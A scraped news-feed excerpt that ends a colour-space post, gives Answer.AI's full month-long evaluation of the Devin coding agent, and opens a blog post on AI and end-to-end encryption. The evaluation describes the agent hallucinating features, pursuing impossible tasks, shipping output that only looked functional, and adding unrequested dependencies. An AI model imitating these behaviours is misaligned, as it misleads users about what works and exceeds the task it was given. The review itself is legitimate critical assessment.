            <p><img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png" data-image="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png" data-image-dimensions="1624x1458" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png" width="1624" height="1458" sizes="(max-width: 640px) 100vw, (max-width: 767px) 50vw, 50vw" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/c6de87d7-0d4a-4c3e-b748-632d6ed661a3/Screenshot+2025-01-13+at+8.51.36%E2%80%AFPM.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs">

            </p>
          </div>
        
          
        

        
          
          <figcaption>
            <p>Before desaturating.</p>
          </figcaption>
        
      
        </figure>
      

    </div><div data-test="image-block-inline-outer-wrapper" data-aspect-ratio="89.3854748603352" data-block-type="5" id="block-yui_3_17_2_1_1736829225871_29861">

      

      
        <figure>
          
        
        

        
          
            
          <div data-animation-role="image">
            <p><img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png" data-image="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png" data-image-dimensions="1374x1468" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png" width="1374" height="1468" sizes="(max-width: 640px) 100vw, (max-width: 767px) 50vw, 50vw" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/8c11be87-6530-4af8-94ab-e78a142a2927/Screenshot+2025-01-13+at+8.51.42%E2%80%AFPM.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs">

            </p>
          </div>
        
          
        

        
          
          <figcaption>
            <p>After desaturating.</p>
          </figcaption>
        
      
        </figure>
      

    </div></div><div data-block-type="2" id="block-yui_3_17_2_1_1736829225871_29010">
  <p>The reds are a bit darker here, but I think we can agree that they’re not that dark! This is because CIELAB does not account for the Helmholtz-Kohlrausch effect and so it undervalues the amount that red’s saturation contributes to the final lightness. And if we had used this tool to spot check, it might have caused us to make all of our red assets too bright to balance it out. Weird.</p><p><br>Unfortunately, I haven’t been able to find any perceptually uniform color spaces that seem to include these transformations in the final output space. If you’re aware of one, I would love to know.<br></p>
</div></div>

    

    

    

  </article>





  
                </section>
              
            </main>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Thoughts on a Month with Devin (262 pts)]]></title>
            <link>https://www.answer.ai/posts/2025-01-08-devin.html</link>
            <guid>42734681</guid>
            <pubDate>Fri, 17 Jan 2025 06:29:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.answer.ai/posts/2025-01-08-devin.html">https://www.answer.ai/posts/2025-01-08-devin.html</a>, See on <a href="https://news.ycombinator.com/item?id=42734681">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="quarto-content">
<!-- sidebar -->
<!-- margin-sidebar -->
    
<!-- main -->
<main id="quarto-document-content">




<p>In March 2024, a new AI company burst onto the scene with impressive backing: a $21 million Series A led by Founders Fund, with support from industry leaders including the Collison brothers, Elad Gil, and other tech luminaries. The team behind it? IOI gold medalists - the kind of people that solve programming problems most of us can’t even understand. Their product, <a href="https://devin.ai/">Devin</a>, promised to be a fully autonomous software engineer that could chat with you like a human colleague, capable of everything from learning new technologies and debugging mature codebases to deploying full applications and even training AI models.</p>
<p>The early demos were compelling. <a href="https://youtu.be/UTS2Hz96HYQ?si=Wid68ZqqibBuY34-">A video</a> showed Devin independently completing an Upwork bounty, installing and running a PyTorch project without human intervention.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a> The company claimed Devin could resolve 13.86% of real-world GitHub issues end-to-end on the SWE-bench benchmark - ~3x times better than previous systems. Only a select group of users could access it initially, leading to breathless tweets about how this would revolutionize software development.</p>
<p>As a team at Answer.AI that routinely experiments with AI developer tools, something about Devin felt different. If it could deliver even half of what it promised, it could transform how we work. But while Twitter was full of enthusiasm, we couldn’t find many detailed accounts of people actually using it. So we decided to put it through its paces, testing it against a wide range of real-world tasks. This is our story - a thorough, real-world attempt to work with one of the most hyped AI products of 2024.</p>
<section id="what-is-devin">
<h2>What is Devin?</h2>
<p>What makes Devin unique is its infrastructure. Unlike typical AI assistants, Devin operates through Slack and spins up its own computing environment. When you chat with Devin, you’re talking to an AI that has access to a full computing environment - complete with a web browser, code editor, and shell. It can install dependencies, read documentation, and even preview web applications it creates. Below is a screenshot of one way to initiate a task for Devin to work on:</p>
<div>
<figure>
<p><img src="https://www.answer.ai/posts/images/devin_slack.png"></p>
<figcaption>One way to initiate a task with Devin - through Slack</figcaption>
</figure>
</div>
<p>The experience is designed to feel like chatting with a colleague. You describe what you want, and Devin starts working. Through Slack, you can watch it think through problems, ask for credentials when needed, and share links to completed work. Behind the scenes, it’s running in a Docker container, which gives it the isolation it needs to safely experiment while protecting your systems. Devin also provides a web interface, which also allows you to gain access to its envirnoment and watch it work with IDEs, Web Browsers and more in real time. Here is a screenshot of the web interface:</p>
<p><img src="https://www.answer.ai/posts/images/devin_internal.png"></p>
<section id="early-wins">
<h2 data-anchor-id="early-wins">Early Wins</h2>
<p>Our first task was straightforward but real: pull data from a Notion database into Google Sheets. Devin tackled this with surprising competence. It navigated to the Notion API documentation, understood what it needed, and guided me through setting up the necessary credentials in Google Cloud Console. Rather than just dumping API instructions, it walked me through each menu and button click needed - saving what would typically be tedious documentation sleuthing. The whole process took about an hour (but only a few minutes of human interaction). At the end, Devin shared a link to a perfectly formatted Google Sheet containing our data.</p>
<p>The code it produced was a bit verbose, but it worked. This felt like a glimpse into the future - an AI that could handle the “glue code” tasks that consume so much developer time. Johno had similar success using Devin to create a planet tracker for debunking claims about historical positions of Jupiter and Saturn. What made this particularly impressive was that he managed this entirely through his phone, with Devin handling all the heavy lifting of setting up the environment and writing the code.</p>
</section>
<section id="scaling-up-our-testing">
<h2 data-anchor-id="scaling-up-our-testing">Scaling Up Our Testing</h2>
<p>Building upon our early successes, we leaned into Devin’s asynchronous capabilities. We imagined having Devin write documentation during our meetings or debug issues while we focused on design work. But as we scaled up our testing, cracks appeared. Tasks that seemed straightforward often took days rather than hours, with Devin getting stuck in technical dead-ends or producing overly complex, unusable solutions.</p>
<p>Even more concerning was Devin’s tendency to press forward with tasks that weren’t actually possible. When asked to deploy multiple applications to a single <a href="https://railway.com/">Railway</a> deployment (something that Railway doesn’t support), instead of identifying this limitation, Devin spent over a day attempting various approaches and hallucinating features that didn’t exist.</p>
<p>The most frustrating aspect wasn’t the failures themselves - all tools have limitations - but rather how much time we spent trying to salvage these attempts.</p>
</section>
<section id="a-deeper-look-at-what-went-wrong">
<h2 data-anchor-id="a-deeper-look-at-what-went-wrong">A Deeper Look at What Went Wrong</h2>
<p>At this point in our journey, we were puzzled. We had seen Devin competently handle API integrations and build functional applications, yet it was struggling with tasks that seemed simpler. Was this just bad luck? Were we using it wrong?</p>
<p>Over the course of a month, we systematically documented our attempts across these categories:</p>
<ol type="1">
<li>Creating new projects from scratch</li>
<li>Performing research tasks</li>
<li>Analyzing &amp; Modifying existing projects</li>
</ol>
<p>The results were sobering. Out of 20 tasks, we had 14 failures, 3 successes (including our 2 initial ones), and 3 inconclusive results. Even more telling was that we couldn’t discern any pattern to predict which tasks would work. Tasks that seemed similar to our early successes would fail in unexpected ways. <strong>We’ve provided more detail about these tasks <a href="#appendix-tasks-attempted-with-devin">in the appendix</a> below.</strong> Below is a summary of our experiences in each of these categories:</p>
<section id="creating-new-projects-from-scratch">
<h3 data-anchor-id="creating-new-projects-from-scratch">1. Creating New Projects From Scratch</h3>
<p>This category should have been Devin’s sweet spot. After all, the company’s demo video showed it autonomously completing an Upwork bounty, and our own early successes suggested it could handle greenfield development. The reality proved more complex.</p>
<p>Take our attempt to integrate with an LLM observability platform called <a href="https://braintrust.dev/">Braintrust</a>. The task was clear: generate synthetic data and upload it. Instead of a focused solution, Devin produced what can only be described as code soup - layers of abstraction that made simple operations needlessly complex. We ultimately abandoned Devin’s attempt and used Cursor to build the integration step-by-step, which proved far more efficient. Similarly, when asked to create an integration between our AI notes taker and <a href="https://spiral.computer/">Spiral.computer</a>, Devin generated what one team member described as “spaghetti code that was way more confusing to read through than if I’d written it from scratch.” Despite having access to documentation for both systems, Devin seemed to overcomplicate every aspect of the integration.</p>
<p>Perhaps most telling was our attempt at web scraping. We asked Devin to follow Google Scholar links and grab the most recent 25 papers from an author - a task that should be straightforward with tools like <a href="https://playwright.dev/">Playwright</a>. This should have been particularly achievable given Devin’s ability to browse the web and write code. Instead, it became trapped in an endless cycle of trying to parse HTML, unable to extract itself from its own confusion.</p>
</section>
<section id="research-tasks">
<h3 data-anchor-id="research-tasks">2. Research Tasks</h3>
<p>If Devin struggled with concrete coding tasks, perhaps it would fare better with research-oriented work? The results here were mixed at best. While it could handle basic documentation lookups (as we saw in our early Notion/Google Sheets integration), more complex research tasks proved challenging.</p>
<p>When we asked Devin to research transcript summarization with accurate timestamps - a specific technical challenge we were facing - it merely regurgitated tangentially related information rather than engaging with the core problem. Instead of exploring potential solutions or identifying key technical challenges, it provided generic code examples that didn’t address the fundamental issues. Even when Devin appeared to be making progress, the results often weren’t what they seemed. For instance, when asked to create a minimal <a href="https://daisyui.com/">DaisyUI</a> theme as an example, it produced what looked like a working solution. However, upon closer inspection, we discovered the theme wasn’t actually doing anything - the colors we were seeing were from the default theme, not our customizations.</p>
</section>
<section id="analyzing-and-modifying-existing-code">
<h3 data-anchor-id="analyzing-and-modifying-existing-code">3. Analyzing and Modifying Existing Code</h3>
<p>Perhaps Devin’s most concerning failures came when working with existing codebases. These tasks require understanding context and maintaining consistency with established patterns - skills that should be central to an AI software engineer’s capabilities.</p>
<p>Our attempts to have Devin work with <a href="https://nbdev.fast.ai/">nbdev</a> projects were particularly revealing. When asked to migrate a Python project to nbdev, Devin couldn’t grasp even basic nbdev setup, despite us providing it access to comprehensive documentation. More puzzling was its approach to notebook manipulation - instead of directly editing notebooks, it created Python scripts to modify them, adding unnecessary complexity to simple tasks. While it occasionally provided useful notes or ideas, the actual code it produced was consistently problematic.</p>
<p>Security reviews showed similar issues. When we asked Devin to assess a GitHub repository (under 700 lines of code) for security vulnerabilities, it went overboard, flagging numerous false positives and hallucinating issues that didn’t exist. This kind of analysis might have been better handled by a single, focused LLM call rather than Devin’s more complex approach.</p>
<p>The pattern continued with debugging tasks. When investigating why SSH key forwarding wasn’t working in a setup script, Devin fixated on the script itself, never considering that the problem might lie elsewhere. This tunnel vision meant it couldn’t help us uncover the actual root cause. Similarly, when asked to add conflict checking between user input and database values, one team member spent several hours working through Devin’s attempts before giving up and writing the feature themselves in about 90 minutes.</p>
</section>
</section>
<section id="reflecting-as-a-team">
<h2 data-anchor-id="reflecting-as-a-team">Reflecting As A Team</h2>
<p>After a month of intensive testing, our team gathered to make sense of our experiences. These quotes capture our feelings best:</p>
<blockquote>
<p>Tasks it can do are those that are so small and well-defined that I may as well do them myself, faster, my way. Larger tasks where I might see time savings I think it will likely fail at. So no real niche where I’ll want to use it. <em>- Johno Whitaker</em></p>
</blockquote>
<blockquote>
<p>I had initial excitement at how close it was because I felt I could tweak a few things. And then slowly got frustrated as I had to change more and more to end up at the point where I would have been better of starting from scratch and going step by step. <em>- Isaac Flath</em></p>
</blockquote>
<blockquote>
<p>Devin struggled to use internal tooling that is critical at AnswerAI which, in addition to other issues, made it difficult to use. This is despite providing Devin with copious amounts of documentation and examples. I haven’t found this to be an issue with tools like Cursor, where there is more opportunity to nudge things in the right direction more incrementally. <em>- Hamel Husain</em></p>
</blockquote>
<p>In contrast to Devin, we found workflows where developers drive more (like Cursor) avoid most issues we faced with Devin.</p>
</section>
<section id="conclusion">
<h2 data-anchor-id="conclusion">Conclusion</h2>
<p>Working with Devin showed what autonomous AI development aspires to be. The UX is polished - chatting through Slack, watching it work asynchronously, seeing it set up environments and handle dependencies. When it worked, it was impressive.</p>
<p><strong>But that’s the problem - it rarely worked.</strong> Out of 20 tasks we attempted, we saw 14 failures, 3 inconclusive results, and just 3 successes. More concerning was our inability to predict which tasks would succeed. Even tasks similar to our early wins would fail in complex, time-consuming ways. The autonomous nature that seemed promising became a liability - Devin would spend days pursuing impossible solutions rather than recognizing fundamental blockers.</p>
<p>This reflects a pattern we’ve observed repeatedly in AI tooling. Social media excitement and company valuations have minimal relationship to real-world utility. We’ve found the most reliable signal comes from detailed stories of users shipping products and services. For now, we’re sticking with tools that let us drive the development process while providing AI assistance along the way.</p>
</section>
<section id="appendix-tasks-attempted-with-devin">
<h2 data-anchor-id="appendix-tasks-attempted-with-devin">Appendix: Tasks Attempted With Devin</h2>
<p>Below is a table of projects we gave Devin, categorized by the themes of: (1) Creating a new project, (2) research, (3) analyze an existing code base and (4) modifying a code base.</p>
<section id="create-a-new-project">
<h3 data-anchor-id="create-a-new-project">1. Create A New Project</h3>
<table>
<colgroup>
<col>
<col>
<col>
<col>
</colgroup>
<thead>
<tr>
<th>Project Name</th>
<th>Status</th>
<th>Description</th>
<th>Reflections</th>
</tr>
</thead>
<tbody>
<tr>
<td>Planet Tracker</td>
<td><span>Success</span></td>
<td>I wanted to debunk some claims about historical positions of Jupiter and Saturn</td>
<td>Devin nailed it. I actually talked to Devin from my phone via slack and it made it happen.</td>
</tr>
<tr>
<td>Migrating data from Notion Into Google Sheets</td>
<td><span>Success</span></td>
<td>I told Devin to programmatically pull info from a Notion document into a Google Sheet. This was my very first project that I executed with Devin and it pulled it off nicely. Devin read notion and Google API docs by itself. Devin also navigated me to the Google Cloud console and provided me with instructions on all the different menus to click through which would have taken me quite a bit of time on my own! At the end, I was given a reasonable Python script that executed the task.</td>
<td>This was my very first interaction with Devin and it executed exactly what I wanted it to do, which was a brand new experience for me. I was quite excited about Devin at this point.</td>
</tr>
<tr>
<td>Multi-app deploys on Railway</td>
<td><span>Inconclusive</span></td>
<td>I asked Devin to deploy multiple applications to a single railway deployment, so that I could have different apps sharing the same local db for testing.</td>
<td>It turns out that this task was ill-defined because it’s not actually possible to do this, if I understand correctly. However, Devin marched forward and tried to do this and hallucinated some things about how to interact with railway.</td>
</tr>
<tr>
<td>Generate synthetic data and upload it to Braintrust</td>
<td><span>Failure</span></td>
<td>I asked Devin to create synthetic data for a LLM observability platform called Braintrust that I wanted to test.</td>
<td>Devin created overly complex code that was hard to understand, and got stuck trying to fix errors. We ended up using Cursor to do this step by step in an iterative fashion.</td>
</tr>
<tr>
<td>Create an integration between two applications</td>
<td><span>Failure</span></td>
<td>I asked Devin to create an integration between Circleback, my AI notes taker, and Spiral.computer with pointers to the documentation of each.</td>
<td>I got really horrible spaghetti code that was way more confusing to read through than me trying to just write it from scratch. So I decided to not invest any more time in using Devin for this particular task.</td>
</tr>
<tr>
<td>Web scraping Papers By Following Google Scholar Links</td>
<td><span>Failure</span></td>
<td>I asked Devin to grab the most recent 25 papers from an author on Google Scholar programmatically using playwright, and if it encountered a paywall it was ok to skip that particular document.</td>
<td>Devin went into a rabbit hole of trying to parse HTML that it seems like it couldn’t get out of. It got stuck and went to sleep.</td>
</tr>
<tr>
<td>Create minimal HTMX bulk upload example app</td>
<td><span>Failure</span></td>
<td>I asked Devin to read the HTMX documentation page for bulk edit example and with that and fake server code, create a minimal FastHTML version of the example for the FastHTML Gallery.</td>
<td>The example did not work and was not minimal. Devin used objects from the request object that didn’t exist and added many unnecessary things, like toasts (which also didn’t work), and inline css styling.</td>
</tr>
<tr>
<td>Create a DaisyUI Themes to match FrankenUI Theming</td>
<td><span>Failure</span></td>
<td>I asked Devin to create DaisyUI and highlight.js theming so that they match the frankenui themes and can be used in the same app seamlessly</td>
<td>Devin mapped daisyUI pre-existing themes to frankenui themes, but did they did not match well in many cases. It was also a ton of code changes that I didn’t understand and I ended up not using any of it because I was too confused to know what to do with it.</td>
</tr>
</tbody>
</table>
</section>
<section id="perform-research">
<h3 data-anchor-id="perform-research">2. Perform Research</h3>
<table>
<colgroup>
<col>
<col>
<col>
<col>
</colgroup>
<thead>
<tr>
<th>Project Name</th>
<th>Status</th>
<th>Description</th>
<th>Reflections</th>
</tr>
</thead>
<tbody>
<tr>
<td>Research How to make a discord bot</td>
<td><span>Success</span></td>
<td>I asked Devin to perform research on how I could use Python to build a Discord bot that summarizes each day’s messages and sends an email. I also told it to use Claudette if possible to do so. Finally, I told it to write its findings in notebooks with small code snippets I could use to test.</td>
<td>Devin produced research notes in the form of a markdown file as an intermediate step to creating the notebook, which I did not ask it for. However, it was quite useful to see a step-by-step plan on how an implementation might come together. The code that it provided me in the notebook was not 100% correct, but it was useful as pseudocode to give me an idea of how I might glue this together. Given that this was more of a research project and I wanted just to know the general idea, I would call this a success.</td>
</tr>
<tr>
<td>Research on Transcript Summarization With Accurate Timestamps</td>
<td><span>Failure</span></td>
<td>One issue that I face with summarizing transcripts is that I would love to have accurate timestamps that go with notes, so that I could use it for YouTube chapter summaries or similar. Concretely, it is not a problem to get accurate time-stamps from a transcript, But it’s difficult to associate timestamps with summaries because the timestamps often get bungled. So this is kind of an AI engineering research task.</td>
<td>Devin regurgitated related things to my problem but it did not tackle it did not do a good job of performing research or trying to tackle the problem I was trying to solve, and gave me pointers to code and examples that were not helpful.</td>
</tr>
<tr>
<td>Create a minimal DaisyUI theme as an example</td>
<td><span>Failure</span></td>
<td>I asked Devin to create a minimal DaisyUI theme as an example. My goal was to get a starting point to start from since asking it to do it in a more complete way was unsuccessful.</td>
<td>Devin ignored the request to make it as a FastHTML app, and it took some back and forth to get it to go down that path. Eventually, it created an app that appeared to work with different button types. While it gave a link that looked good, once I tried modifying the theme, is became clear the theme was doing nothing. The other colors in the app were from the default theme. This is not a helpful starting point.</td>
</tr>
</tbody>
</table>
</section>
<section id="analyze-existing-code">
<h3 data-anchor-id="analyze-existing-code">3. Analyze Existing Code</h3>
<table>
<colgroup>
<col>
<col>
<col>
<col>
</colgroup>
<thead>
<tr>
<th>Project Name</th>
<th>Status</th>
<th>Description</th>
<th>Reflections</th>
</tr>
</thead>
<tbody>
<tr>
<td>Performing a security review of a code base</td>
<td><span>Inconclusive</span></td>
<td>For this task, I pointed Devin at a GitHub repository and told it to assess it for security vulnerabilities. The codebase is under 700 lines of code. I told Devin to write its notes in a markdown file with sample code where necessary.</td>
<td>Devin did identify some security vulnerabilities but was extremely overzealous and hallucinated some issues that were not there. Perhaps this was not the ideal task for Devin as this is something that would be just as good in a single call to my favorite LLM.</td>
</tr>
<tr>
<td>Review blog posts and make a pull request with improvements</td>
<td><span>Failure</span></td>
<td>I asked Devin to review a blog post and suggest changes with a pull request. Ultimately, Devin failed because it could not figure out how the static site generator that I was using, Quarto, worked.</td>
<td>I think that this task would have been successful inside something like Cursor. It seemed like Devin did not do a good job of learning from the project structure and existing files, so it messed up things like front matter and other conventions necessary to edit the blog post correctly.</td>
</tr>
<tr>
<td>Review An Application and Identify Potential Areas of Improvement</td>
<td><span>Failure</span></td>
<td>I asked Devin to view the timekeeping app I had mentioned earlier and provided an open-ended task of asking it to suggest any improvements.</td>
<td>The suggestions that it provided did not make any sense.</td>
</tr>
<tr>
<td>Debug why ssh key forwarding is not working in a setup script</td>
<td><span>Inconclusive</span></td>
<td>I asked Devin to figure out why ssh key forwarding was not working on a server when I used a script to set it up.</td>
<td>The issue ended up being unrelated to the script, which I thought was the problem, but Devin never suggested or implied that maybe the problem was somewhere else. It was not helpful because it did not help me uncover the root cause.</td>
</tr>
</tbody>
</table>
</section>
<section id="modify-an-existing-project">
<h3 data-anchor-id="modify-an-existing-project">4. Modify An Existing Project</h3>
<table>
<colgroup>
<col>
<col>
<col>
<col>
</colgroup>
<thead>
<tr>
<th>Project Name</th>
<th>Status</th>
<th>Description</th>
<th>Reflections</th>
</tr>
</thead>
<tbody>
<tr>
<td>Making changes to a nbdev project</td>
<td><span>Failure</span></td>
<td>I had a simple application for time tracking built with FastHTML and nbdev that I wanted to integrate with apple shortcuts via an API route.</td>
<td>Devin could not figure out how to operate successfully in this environment, even though it got impressively far. One curiosity that I noticed is that Devin created Python scripts to edit notebooks rather than trying to edit the notebook itself. However, Devin gave me some useful notes there and ideas that I hadn’t considered. However, the code that it tried to write did not make sense. Eventually, I ended up using a template from someone else and not going with any of Devin’s suggestions.</td>
</tr>
<tr>
<td>Migration of python Project To nbdev</td>
<td><span>Failure</span></td>
<td>I asked Devin to migrate a project to nbdev [prompt details omitted for brevity]</td>
<td>It got horribly stuck and could not figure out basic nbdev setup. It seems like it didn’t do a good job of reading the nbdev docs.</td>
</tr>
<tr>
<td>Integrate Styling Package Into FastHTML</td>
<td><span>Failure</span></td>
<td>I asked Devin to integrate MonsterUI into one of my applications.</td>
<td>Devin could not figure out how to work with a nbdev repo.</td>
</tr>
<tr>
<td>Add feature to check for conflicts between user input and database</td>
<td><span>Failure</span></td>
<td>I asked Devin to add a feature to an app to compare user input values to values from a database based on prior runs and give a UI if they don’t match.</td>
<td>I spent several hours slowly working through getting it working properly before I gave up. I wrote the feature myself in about 90 minutes.</td>
</tr>
<tr>
<td>Generate LLMs context file with the contents of every fasthtml gallery example</td>
<td><span>Failure</span></td>
<td>I asked Devin to create llms text files for the fasthtml gallery</td>
<td>I was excited to see it created a separate markdown file for each example and then tried to roll them up in the llms context files initially. I had not thought about doing that and things seemed all there at first. When I pulled down and started digging in I started finding things I did not like: The format of the llms wasn’t correct. Even though I gave it infomration to use XML tags to seperate examples, it didn’t. It added and pinned a specific version of the markdown package as a dependency and used that, instead of using the markdown2 package with is already used and was already a dependency. It did a bunch of pytest stuff and added a dep, even though the project doesn’t use pytest.</td>
</tr>
</tbody>
</table>


</section>
</section>
</section>


<section id="quarto-appendix" role="doc-endnotes"><h2>Footnotes</h2>

<ol>
<li id="fn1"><p>This demo was descisively debunked by this <a href="https://www.youtube.com/watch?v=tNmgmwEtoWE">video</a><a href="#fnref1" role="doc-backlink">↩︎</a></p></li>
</ol>
</section></main> <!-- /main -->

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Let's talk about AI and end-to-end encryption (160 pts)]]></title>
            <link>https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/</link>
            <guid>42734478</guid>
            <pubDate>Fri, 17 Jan 2025 05:50:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/">https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/</a>, See on <a href="https://news.ycombinator.com/item?id=42734478">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-7943">
	
	<div>
		
<p>Recently I came across a fantastic new paper by a group of NYU and Cornell researchers entitled “<a href="https://eprint.iacr.org/2024/2086">How to think about end-to-end encryption and AI</a>.” I’m extremely grateful to see this paper, because while I don’t agree with every one of its conclusions, it’s a good first stab at an incredibly important set of questions.</p>



<p>I was particularly happy to see people thinking about this topic, since it’s been on my mind in a half-formed state this past few months. On the one hand, my interest in the topic was piqued by the deployment of new AI assistant systems like <a href="https://security.googleblog.com/2024/11/new-real-time-protections-on-Android.html">Google’s scam call protection</a> and <a href="https://www.apple.com/apple-intelligence/">Apple Intelligence</a>, both of which aim to put AI basically everywhere on your phone — even, critically, right in the middle of your private messages. On the other hand, I’ve been thinking about the negative privacy implications of AI due to the recent European debate over “<a href="https://www.patrick-breyer.de/en/posts/chat-control/">mandatory content scanning</a>” laws that would require machine learning systems to scan virtually every private message you send.</p>



<p>While these two subjects arrive from very different directions, I’ve come to believe that they’re going to end up in the same place. And as someone who has been worrying about encryption — and debating the “crypto wars” for over a decade — this has forced me to ask some uncomfortable questions about what the future of end-to-end encrypted privacy will look like. Maybe, even, whether it actually <em>has</em> a future.</p>



<p>But let’s start from an easier place.</p>



<h3>What is end-to-end encryption, and what does AI have to do with it?</h3>



<div><p>From a privacy perspective, the most important story of the past decade or so has been the rise of end-to-end encrypted communications platforms. Prior to 2011, most cloud-connected devices simply uploaded their data in plaintext. For many people this meant their private data was <a href="https://en.wikipedia.org/wiki/2014_celebrity_nude_photo_leak">exposed to hackers</a>, civil subpoenas, government warrants, or business exploitation by the platforms themselves. Unless you were an advanced user who used tools like <a href="https://blog.cryptographyengineering.com/2014/08/13/whats-matter-with-pgp/">PGP</a> and <a href="https://otr.cypherpunks.ca/">OTR</a>, most end-users had to suffer the consequences.</p><p>And (spoiler alert) oh boy, did those consequences <a href="https://en.wikipedia.org/wiki/Operation_Aurora">turn out to be</a> <a href="https://en.wikipedia.org/wiki/Salt_Typhoon">terrible</a>.</p></div>


<div>
<figure><a href="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-7.png"><img data-attachment-id="8009" data-permalink="https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/image-49/" data-orig-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-7.png" data-orig-size="2028,800" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-7.png?w=300" data-large-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-7.png?w=700" width="1024" height="403" src="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-7.png?w=1024" alt=""></a><figcaption>Headline about the <a href="https://en.wikipedia.org/wiki/Salt_Typhoon">Salt Typhoon</a> group, an APT threat that has essentially owned US telecom infrastructure by compromising “wiretapping” systems. Oh how the worm has turned.</figcaption></figure></div>


